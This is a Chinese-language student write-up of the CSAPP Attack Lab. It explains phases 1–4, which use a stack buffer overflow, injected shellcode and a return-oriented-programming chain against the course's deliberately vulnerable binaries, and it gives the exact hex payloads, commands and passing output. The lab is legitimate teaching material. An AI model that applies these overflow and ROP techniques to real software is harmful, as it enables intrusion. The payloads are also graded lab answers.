#! https://zhuanlan.zhihu.com/p/454224518

# CSAPP Attack Lab

这是我实现CSAPP Attack Lab的笔记。Attack Lab属于前几个Lab，代码量不是很大，更重视原理和理解。做的内容是我个人之前不熟悉的东西，觉得非常有趣。本文的源码在[这里](https://github.com/Anarion-zuo/AnBlogs/blob/master/csapp/attacklab.md)。

这个lab要求我们：

1. 深入理解缓冲区溢出`buffer overflow`的情形，
2. 体会几种可能危害到系统安全的场景，
3. 熟悉`x86`汇编指令集。

如果你想做以上这些事情，那么这个lab非常适合你。

## 准备

和其他Lab一样，先要上[官网](http://csapp.cs.cmu.edu/3e/labs.html)下载资源。在开始之前，先阅读`handout`和CSAPP书3.10节有关内容，弄清楚**代码注入**`code injection`和**面向返回**`return oriented programming`两种攻击方式。

除此之外，还需要安装好`objdump`反汇编工具。

我的代码在我的[GitHub仓库](https://github.com/Anarion-zuo/csapp/tree/attack/target1)，一如既往地写得乱。本文中会展示主要代码，所以你不需要看我的完整代码也能懂我意思。

## 代码注入攻击

这个Lab中所说的`Code Injection`攻击，就是通过溢出写缓冲区，更改函数的返回地址。

函数`getbuf`调用了`scanf`，并为`scanf`提供了一个指针，让`scanf`把读到的内容往这个地址上写。由于没有让`scanf`检查读入的内容长度是否超出某个数值，`scanf`不管接受到什么都一顿写，写着写着就超出了原来数组定义的范围。

数组存在于栈上，栈由高地址向低地址生长，故从数组开头的地址往地址增大的方向走，就可以走到保存函数调用返回值地址的地方。如果函数中仅仅定义了这一个变量，只要得知数组声明长度，就相当于获得了函数返回地址的编辑权。

如果你不熟悉返回值地址，这里简单说明一下。`x86`指令集实现函数的方法是，使用`call`指令，给指令地址寄存器`rip`赋值，跳转到指定指令，同时把`call`指令的下一个地址的指令压栈。函数返回时，栈指针恢复到函数调用时的状态，这时的栈顶就是返回值地址，弹出栈顶就可以确定要执行的下一条指令。我们编辑了这个返回地址，就可以让代码跳转到我们想要的地方。

```
|               |
|_______________|  <-- caller stack
|__return addr__|
|               |  <-- buf ends
.               .
.               .
.               .
|               |
|_______________|  <-- buf
```

## 让getbuf返回到指定地址

这是`Phase 1`要做的事情。我们要做的是给`getbuf`输入正确的一串字符，修改返回值地址。

先研究`getbuf`的内容，看看`getbuf`反汇编代码。

```nasm
; objdump -d ctarget > ctarget.s
00000000004017a8 <getbuf>:
  ; allocate on stack
  ; 40 bytes
  4017a8:    48 83 ec 28              sub    $0x28,%rsp
  4017ac:    48 89 e7                 mov    %rsp,%rdi
  4017af:    e8 8c 02 00 00           call   401a40 <Gets>
  4017b4:    b8 01 00 00 00           mov    $0x1,%eax
  4017b9:    48 83 c4 28              add    $0x28,%rsp
  4017bd:    c3                       ret    
  4017be:    90                       nop
  4017bf:    90                       nop
```

第一个`sub`指令把栈顶往下挪了40字节，也就是给缓冲区分配了40字节，然后调用了`Gets`，`Gets`从终端IO拿字符。所以，我们需要给进程从终端传递48个字符，并小心设置最后8字符。最后8字符的ASCII码应该对应函数`touch1`的地址。

`handout`为我们准备了一个把十六进制表示转换为二进制数据的工具`hex2raw`，确定好要给`ctarget`输入的信息，用`hex2raw`转换，通过`Linux`终端的IO重定向功能，就可以输入给进程。

找到`touch1`函数的地址为`0x4017c0`，由于缓冲区是从低地址向高地址填满，故把它放在字节序列的最后。注意到，现代几乎所有计算机都是小端存储，如果字节序列是从左到右按低地址到高地址排列，那么字节显示顺序就应和人习惯上的阅读顺序相反。综上，我们应该给`ctarget`喂的字节序列用十六进制表达，应该是：

```
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40 00 
00 00 00 00
```

转换成原生数据，存到另一个文件。

```shell
./hex2raw < probehex-touch1.txt > proberaw-touch1
```

喂给`catarget`。

```shell
./ctarget -q -i ./proberaw-touch1
```

得到成功提示：

```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40 00 00 00 00 00
```

## 给被返回的函数传个参数

这是`Phase 2`要做的事情。不但要让`ctarget`跳转到指定函数，还要给那个函数传个参数。要跳转到的函数是`touch2`，先看看反汇编代码：

```nasm
00000000004017ec <touch2>:
  4017ec:    48 83 ec 08              sub    $0x8,%rsp
  4017f0:    89 fa                    mov    %edi,%edx
  4017f2:    c7 05 e0 2c 20 00 02     movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:    00 00 00 
  4017fc:    3b 3d e2 2c 20 00        cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:    75 20                    jne    401824 <touch2+0x38>
  401804:    be e8 30 40 00           mov    $0x4030e8,%esi
  401809:    bf 01 00 00 00           mov    $0x1,%edi
  40180e:    b8 00 00 00 00           mov    $0x0,%eax
  401813:    e8 d8 f5 ff ff           call   400df0 <__printf_chk@plt>
  401818:    bf 02 00 00 00           mov    $0x2,%edi
  40181d:    e8 6b 04 00 00           call   401c8d <validate>
  401822:    eb 1e                    jmp    401842 <touch2+0x56>
  401824:    be 10 31 40 00           mov    $0x403110,%esi
  401829:    bf 01 00 00 00           mov    $0x1,%edi
  40182e:    b8 00 00 00 00           mov    $0x0,%eax
  401833:    e8 b8 f5 ff ff           call   400df0 <__printf_chk@plt>
  401838:    bf 02 00 00 00           mov    $0x2,%edi
  40183d:    e8 0d 05 00 00           call   401d4f <fail>
  401842:    bf 00 00 00 00           mov    $0x0,%edi
  401847:    e8 f4 f5 ff ff           call   400e40 <exit@plt>
```

对比`Writeup`里面的C代码，可以看到，`val`是参数，而且出现在了第一个`cmp`指令中。第一个`cmp`指令比较了`edi`寄存器和一个内存中的变量的大小，其中内存中的变量被指出是`cookie`的值，所以`rdi`寄存器里面放着要传的参数。

我们的任务是把`cookie`的值放到`rdi`寄存器，然后跳转到`touch2`。这就要执行多条指令，我们要让程序先跳转执行我们设置的几条指令。这几条指令的二进制数据也要通过终端IO输入进来。

先找个地方放指令。可以放指令的地方很多，可以说是整个栈。只要填充多几个字节，想放在栈的哪个位置都可以。为了简单，这里就放在之前输入的48个字节的开头。

要确定指令二进制数据的内容，先写出指令，编译之后再反编译，就可以知道十六进制表达形式。

写出指令：

```nasm
movq    $0x59b997fa,%rdi
pushq   $0x4017ec
ret
```

编译一下：

```shell
gcc -c inject-touch2.s
```

再反编译：

```shell
objdump -d inject-touch2.o
```

就获得了指令的十六进制表达。

还要确定返回地址的内容。返回地址应该给成上面几条指令存放的地址，这个地址由栈的位置决定。通过`gdb`确定进入`getbuf`后，分配完`buf`数组时`rsp`寄存器的值。这时的`rsp`寄存器的值就是`buf`寄存器的开头地址，把指令放在输入的开头，这就是指令的位置。

`gdb`设置断点在`getbuf`函数，然后步进到`sub`指令为`buf`分配完空间之后，查看`rsp`的值。

我得到的`rsp`的值为`0x5561dc78`，故应该输入到终端的数据的十六进制表达为：

```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 78 dc 61 55 00 00 00 00
```

用`hex2raw`转换了之后，输入给`ctarget`，就通过了`Phase 2`。

```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 78 DC 61 55 00 00 00 00
```

## 给函数传个字符串

这是`Phase 3`要做的事情。和上面一样，函数的参数放在`rdi`寄存器。我们要给`rdi`寄存器存进一个字符串的开头，这个字符串放`cookie`的十六进制字符串`5561dc78`。

这个字符串也是我们通过终端输入注入的，需要放在某个地方。这时就可以放在更远的栈上了，需要小心推算位置。

`Writeup`提醒我们注意，`touch3`会调用函数，会往栈上写东西。如果把字符串放在原来`buf`数组内部，可能会让字符串内容被污染。我们一定要把字符串放在`getbuf`函数存放返回地址的上面。

```
|  "5561dc78"   |  <-- cookie str
|               |
.               .
.               .
|               |
|_______________|  <-- getbuf's caller stack
|__return addr__|
|               |  <-- buf ends
.               .
.               .
.               .
|               |
|_______________|  <-- buf
```

这很好办，通过终端多输入一些字节就可以了。

我没有采用以上所描述的办法，因为要仔细数输入字节的个数，差一点都不行，这很麻烦。可以让注入执行的代码往栈的某个位置赋值，把`cookie`的`ASCII码表示写进内存。

```nasm
movq  $0x6166373939623935,%rbx
movq  $0x5561dca8,%rcx
movq  %rbx,0(%rcx)   ; 寄存器间接寻址
movl  $0x0,8(%rcx)   ; '\0'
```

不要忘了最后的终止符号`0`。

这样也直接确定了字符串的位置，是我随便取的，直接把地址给`rdx`就可以。

```nasm
movq  $0x5561dca8,%rdi
```

然后跳转到`touch3`。

```nasm
pushq  $0x4018fa
ret
```

把这段代码像之前一样通过终端输入注入到`ctarget`，不需要担心`touch3`会更改`buf`的空间，因为这段空间到那时候就已经执行完、没有用了。

通过终端输入的内容为：

```
48 bb 35 39 62 39 39 37 66 61 48 c7 c1 a8 dc 61 55 48 
89 19 c7 41 08 00 00 00 00 48 c7 c7 a8 dc 61 55 68 fa 
18 40 00 c3 78 dc 61 55 00 00 00 00
```

这样就完成了`Phase 3`。

```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 BB 35 39 62 39 39 37 66 61 48 C7 C1 A8 DC 61 55 48 89 19 C7 41 08 00 00 00 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 78 DC 61 55 00 00 00 00 
```

## 面向返回编程ROP

现代操作系统和编译器都采用了栈随机机制，不能很容易获得栈的地址。这次执行获得了栈的地址，下一次栈就不在这个位置了。即便能确定栈的地址，这些地址上的数据也被标为**不可执行**，不能直接注入再使用。

`Phase 4`和`5`带我们看另一种机制，也就是`Return Oriented Programming`。

可执行文件中存在很多可执行的数据，在`.text`段中。它们之中又存在很多值为`c3`的字节，编码为`ret`指令。令程序跳转到这些字节之前的一个位置，CPU把前面这一段数据按指令解读，执行完后，就会执行`ret`指令，跳转到现在栈上存放的一个地址。新到达的地址也是`c3`结尾的，这样就又执行完了一个指令，再根据栈上的信息继续跳转。

找到`.text`段中所有值为`c3`的字节，设置好栈，让程序依次跳转到它们之前，把它们之前的字节按照指令来执行。这样即使不能注入代码，也能利用程序原有的代码做点事情。

## 跳转到函数并传参

`Phase 4`要求我们利用ROP实现和`Phase 2`一样的效果。在跳转到`touch2`之前，我们的任务是把`0x59b997fa`放进寄存器`rdi`。

先找到`gadget farm`里面所有的`c3`出现的地方，然后看看哪个能为我所用。

```nasm
00000000004019a0 <addval_273>:
4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax
4019a6: c3

00000000004019ca <getval_280>:
4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax
4019cf: c3
```

发动火眼金睛，发现`0x4019ca`这个指令中包含二进制序列`58 90 c3`，如果从`58`开始按指令解释，就是：

```nasm
popq  $rax
nop
ret
```

其中`nop`是空指令，什么也不干。于是，我找到了可以从栈上弹东西到`rax`的指令。接下来要把十六进制数`59b99fa`放在栈的合适位置上，然后把`rax`的值想办法传给`rdi`就可以。

再发动火眼金睛，发现`0x4019a0`这个指令中包含二进制序列`89 c7 c3`。解释为：

```nasm
movl  %eax,%edi
ret
```

至此，所有需要的信息都有了。想开出火眼金睛，可以到`Writeup`的表格里面找找灵感，还要记得，给终端的输入不能出现换行符，`nop`空指令的编码是`0x90`。我也在这卡了很久，悟出空指令这里才豁然开朗。

总结一下，动作应该是这样的：

1. `getbuf`执行`ret`指令，跳转到上文`popq`指令。

2. 执行`popq`指令，`rax`具有`cookie`的值。

3. 执行`ret`指令，跳转到上文`movl`指令，`rdi`具有`cookie`的值。

4. 执行`ret`指令，跳转到`touch2`函数。

所以，`getbuf`执行`ret`指令之前，栈上的内容，从栈顶开始，依次为：

1. `popq`指令地址，计算得到`0x4019ca + 2 = 0x4019cc`。

2. `cookie`的值。

3. `movl`指令地址，计算得到`0x4019a0 + 3 = 0x4019a3`

4. 函数`touch2`地址。

这些数据应该像之前一样通过终端IO传给进程，放在比返回地址更大的地方。

```
.               .
.               .
|  0x4017ec     |  <-- touch2 addr
|  0x4019a3     |  <-- movl addr
|  0x59b997fa   |  <-- cookie
|  0x4019cc     |  <-- popq addr
|               |  <-- buf ends
.               .
.               .
.               .
|               |
|_______________|  <-- buf
```

依然要注意大端和小端问题。应该喂给进程的字节序列为：

```
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 ec 17 
40 00 00 00 00 00 a3 19 40 00 00 00 00 00 fa 97 b9 59 
00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 
00 00 a3 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 
```

得到成功提示：

```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 EC 17 40 00 00 00 00 00 A3 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A3 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## 给函数传字符串

`Phase 5`要通过ROP实现`Phase 3`传字符串的操作，算作一个加分项。老师在`handout`里面说，如果你对这个特别感兴趣，又没什么别的事情好干了，或者是个卷王，就可以来挑战`Phase 5`。我以上3点都不满足，所以就不做了，以后有兴致在来研究吧。

老师的解答包含8个`gadget`，也就是要找出8个`ret`指令结尾的字节序列。最好的做法应该是写一个辅助脚本，找出`farm`里面所有可能的`gadget`，解析出所有可以用的指令，然后发动火眼金睛。